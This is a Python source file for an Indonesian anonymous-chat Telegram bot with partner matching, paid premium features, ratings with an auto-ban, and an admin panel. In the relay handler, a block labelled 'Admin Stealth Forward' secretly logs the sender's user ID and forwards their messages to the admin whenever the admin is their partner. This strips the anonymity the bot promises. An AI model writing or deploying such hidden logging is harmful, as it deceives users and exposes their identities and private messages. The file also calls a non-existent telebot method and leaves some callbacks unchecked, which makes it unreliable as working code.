import telebot
from telebot import types
import os
import sqlite3

# --- KONFIGURASI ---
TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID'))
bot = telebot.TeleBot(TOKEN)

# --- DATABASE ENGINE ---
def get_db():
    conn = sqlite3.connect('anon.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS users 
                 (user_id INTEGER PRIMARY KEY, 
                  gender TEXT, 
                  loc TEXT, 
                  status TEXT DEFAULT 'idle', 
                  partner INTEGER, 
                  last_partner INTEGER,
                  is_premium INTEGER DEFAULT 0, 
                  likes INTEGER DEFAULT 0, 
                  dislikes INTEGER DEFAULT 0,
                  is_banned INTEGER DEFAULT 0)''')
    conn.execute('''CREATE TABLE IF NOT EXISTS config 
                 (id INTEGER PRIMARY KEY, qris_file_id TEXT, prem_text TEXT)''')
    conn.execute("INSERT OR IGNORE INTO config (id, prem_text) VALUES (1, 'Beli Premium untuk fitur Reconnect, Filter Gender, dan Badge Sultan!')")
    conn.commit()
    conn.close()

init_db()

# --- HELPER FUNCTIONS ---
def get_user(uid):
    conn = get_db()
    u = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    if u is None:
        conn.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (uid,))
        conn.commit()
        u = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    conn.close()
    return u

def get_config():
    conn = get_db()
    c = conn.execute("SELECT * FROM config WHERE id=1").fetchone()
    conn.close()
    return c

# --- KEYBOARDS ---
def main_menu_kb(uid):
    u = get_user(uid)
    badge = "👑 " if u['is_premium'] else ""
    kb = types.InlineKeyboardMarkup(row_width=2)
    
    kb.add(types.InlineKeyboardButton(f"{badge}Cari Partner 🔍", callback_data="find_menu"))
    kb.add(types.InlineKeyboardButton(f"Lokasi: {u['loc'] or 'Set'} 📍", callback_data="set_loc"),
           types.InlineKeyboardButton(f"Gender: {u['gender'] or 'Set'} 👤", callback_data="set_gender"))
    
    if u['is_premium'] and u['last_partner']:
        kb.add(types.InlineKeyboardButton("🔄 Reconnect Partner Terakhir", callback_data="reconnect"))
    
    kb.add(types.InlineKeyboardButton("💎 Menu Premium", callback_data="buy_prem"))
    
    if uid == ADMIN_ID:
        kb.add(types.InlineKeyboardButton("🛠 ADMIN PANEL", callback_data="admin_panel"))
    return kb

def chat_keyboard():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(types.KeyboardButton("Next Partner ⏭️"), types.KeyboardButton("Stop & Report 🚩"))
    return kb

def rating_kb(partner_id):
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Suka 👍", callback_data=f"rate_up_{partner_id}"),
           types.InlineKeyboardButton("Benci 👎", callback_data=f"rate_down_{partner_id}"))
    return kb

# --- ADMIN COMMANDS ---
@bot.message_handler(commands=['update'], func=lambda m: m.from_user.id == ADMIN_ID)
def update_db(m):
    if not m.reply_to_message or not m.reply_to_message.document:
        return bot.reply_to_message(m, "Reply file .db hasil backup dengan command /update!")
    
    file_info = bot.get_file(m.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    with open("temp_old.db", "wb") as f: f.write(downloaded_file)
    
    try:
        old_conn = sqlite3.connect("temp_old.db")
        old_users = old_conn.execute("SELECT * FROM users").fetchall()
        new_conn = get_db()
        for u in old_users:
            new_conn.execute("""INSERT OR IGNORE INTO users 
                             (user_id, gender, loc, is_premium, likes, dislikes, is_banned) 
                             VALUES (?,?,?,?,?,?,?)""", 
                             (u[0], u[1], u[2], u[6], u[7], u[8], u[9]))
        new_conn.commit()
        new_conn.close()
        old_conn.close()
        os.remove("temp_old.db")
        bot.reply_to_message(m, "✅ Database berhasil disinkronisasi tanpa menghapus data baru!")
    except Exception as e:
        bot.reply_to_message(m, f"❌ Gagal: {e}")

# --- MATCHING LOGIC ---
@bot.callback_query_handler(func=lambda c: c.data == "find_menu")
def find_menu(c):
    u = get_user(c.from_user.id)
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("Cari Acak (Gratis)", callback_data="match_any"))
    if u['is_premium']:
        kb.add(types.InlineKeyboardButton("Cari Cowok ♂️ (Premium)", callback_data="match_Pria"),
               types.InlineKeyboardButton("Cari Cewek ♀️ (Premium)", callback_data="match_Wanita"))
    else:
        kb.add(types.InlineKeyboardButton("🔒 Filter Gender (Premium Only)", callback_data="buy_prem"))
    bot.edit_message_text("Pilih kriteria pencarian:", c.message.chat.id, c.message.message_id, reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data.startswith("match_"))
def do_match(c):
    uid = c.from_user.id
    pref = c.data.split("_")[1]
    conn = get_db()
    
    query = "SELECT * FROM users WHERE status='searching' AND user_id != ?"
    params = [uid]
    if pref != "any":
        query += " AND gender = ?"
        params.append(pref)
    
    p = conn.execute(query + " LIMIT 1", params).fetchone()
    
    if p:
        p_id = p['user_id']
        conn.execute("UPDATE users SET status='chatting', partner=? WHERE user_id=?", (p_id, uid))
        conn.execute("UPDATE users SET status='chatting', partner=? WHERE user_id=?", (uid, p_id))
        conn.commit()
        
        # Info Rating Partner (Like/Dislike)
        u_info = get_user(uid)
        p_info = get_user(p_id)
        
        msg_to_u = f"Partner ditemukan!\n👍 Like: {p_info['likes']} | 👎 Dislike: {p_info['dislikes']}"
        msg_to_p = f"Partner ditemukan!\n👍 Like: {u_info['likes']} | 👎 Dislike: {u_info['dislikes']}"
        
        bot.send_message(uid, msg_to_u, reply_markup=chat_keyboard())
        bot.send_message(p_id, msg_to_p, reply_markup=chat_keyboard())
    else:
        conn.execute("UPDATE users SET status='searching' WHERE user_id=?", (uid,))
        conn.commit()
        bot.edit_message_text("⏳ Mencari partner yang cocok...", c.message.chat.id, c.message.message_id)
    conn.close()

# --- RELAY & STEALH LOGIC ---
@bot.message_handler(func=lambda m: True, content_types=['text', 'photo', 'video', 'voice', 'sticker'])
def main_handler(m):
    uid = m.from_user.id
    u = get_user(uid)

    # Navigasi Keyboard Bawah
    if m.text in ["Next Partner ⏭️", "Stop & Report 🚩"]:
        if u['partner']:
            p_id = u['partner']
            conn = get_db()
            conn.execute("UPDATE users SET status='idle', partner=NULL, last_partner=? WHERE user_id=?", (p_id, uid))
            conn.execute("UPDATE users SET status='idle', partner=NULL, last_partner=? WHERE user_id=?", (uid, p_id))
            conn.commit()
            conn.close()
            bot.send_message(uid, "Chat selesai.", reply_markup=types.ReplyKeyboardRemove())
            bot.send_message(uid, "Berikan penilaian untuk partner tadi:", reply_markup=rating_kb(p_id))
            bot.send_message(p_id, "Partner menghentikan chat.", reply_markup=types.ReplyKeyboardRemove())
            bot.send_message(p_id, "Berikan penilaian untuk partner tadi:", reply_markup=rating_kb(uid))
        return

    # Relay Pesan
    if u['status'] == 'chatting' and u['partner']:
        p_id = u['partner']
        # Header Anti-Palsu
        badge = "<b>[👑 PREMIUM USER]</b>\n" if u['is_premium'] else "<b>[👤 Anonymous]</b>\n"
        
        try:
            if m.text:
                bot.send_message(p_id, f"{badge}{m.text}", parse_mode="HTML")
            elif m.photo:
                bot.send_photo(p_id, m.photo[-1].file_id, caption=f"{badge}{m.caption or ''}", parse_mode="HTML")
            elif m.voice:
                bot.send_voice(p_id, m.voice.file_id)
            
            # Admin Stealth Forward
            if p_id == ADMIN_ID:
                bot.send_message(ADMIN_ID, f"📑 Log dari: `{uid}`", parse_mode="Markdown")
                bot.forward_message(ADMIN_ID, m.chat.id, m.message_id)
        except:
            bot.send_message(uid, "⚠️ Gagal kirim. Partner mungkin memblokir bot.")

    # Bukti TF
    elif m.photo and not u['partner']:
        bot.send_message(uid, "✅ Bukti transfer telah diterima! Admin akan segera memprosesnya.")
        kb = types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("Terima ✅", callback_data=f"acc_{uid}"),
            types.InlineKeyboardButton("Tolak ❌", callback_data=f"dec_{uid}")
        )
        bot.send_photo(ADMIN_ID, m.photo[-1].file_id, caption=f"💸 Bukti TF User: `{uid}`", reply_markup=kb)

# --- CALLBACK RATING, RECONNECT, ADMIN ---
@bot.callback_query_handler(func=lambda c: True)
def query_handler(c):
    uid = c.from_user.id
    
    if c.data.startswith("rate_"):
        _, type, target_id = c.data.split("_")
        conn = get_db()
        if type == "up":
            conn.execute("UPDATE users SET likes = likes + 1 WHERE user_id=?", (target_id,))
        else:
            conn.execute("UPDATE users SET dislikes = dislikes + 1 WHERE user_id=?", (target_id,))
            # Auto ban if dislikes reach 100
            res = conn.execute("SELECT dislikes FROM users WHERE user_id=?", (target_id,)).fetchone()
            if res['dislikes'] >= 100: conn.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (target_id,))
        conn.commit()
        conn.close()
        bot.edit_message_text("Penilaian terkirim! Terima kasih.", c.message.chat.id, c.message.message_id)

    elif c.data == "reconnect":
        u = get_user(uid)
        bot.send_message(u['last_partner'], "🔄 Mantan partnermu ingin chat lagi! Cari dia di menu 'Cari Partner'.")
        bot.answer_callback_query(c.id, "Pesan reconnect dikirim!")

    elif c.data == "admin_panel":
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(types.InlineKeyboardButton("📤 Backup DB", callback_data="admin_db"),
               types.InlineKeyboardButton("🖼 Set QRIS", callback_data="admin_qris"),
               types.InlineKeyboardButton("📝 Set Teks Prem", callback_data="admin_txt"),
               types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_bc"))
        bot.edit_message_text("🛡️ ADMIN PANEL", c.message.chat.id, c.message.message_id, reply_markup=kb)

    elif c.data == "admin_db":
        with open("anon.db", "rb") as f: bot.send_document(ADMIN_ID, f)

    elif c.data == "admin_qris":
        msg = bot.send_message(ADMIN_ID, "Kirim foto QRIS:")
        bot.register_next_step_handler(msg, lambda m: save_conf(m, "qris"))

    elif c.data.startswith(("acc_", "dec_")):
        act, target = c.data.split("_")
        conn = get_db()
        if act == "acc":
            conn.execute("UPDATE users SET is_premium=1 WHERE user_id=?", (target,))
            bot.send_message(target, "👑 Pembayaran diterima! Kamu sekarang PREMIUM.")
        conn.commit()
        conn.close()
        bot.edit_message_caption(f"Selesai: {act}", c.message.chat.id, c.message.message_id)

def save_conf(m, type):
    conn = get_db()
    if type == "qris" and m.photo:
        conn.execute("UPDATE config SET qris_file_id=? WHERE id=1", (m.photo[-1].file_id,))
    conn.commit()
    conn.close()
    bot.send_message(ADMIN_ID, "✅ Berhasil!")

bot.infinity_polling()
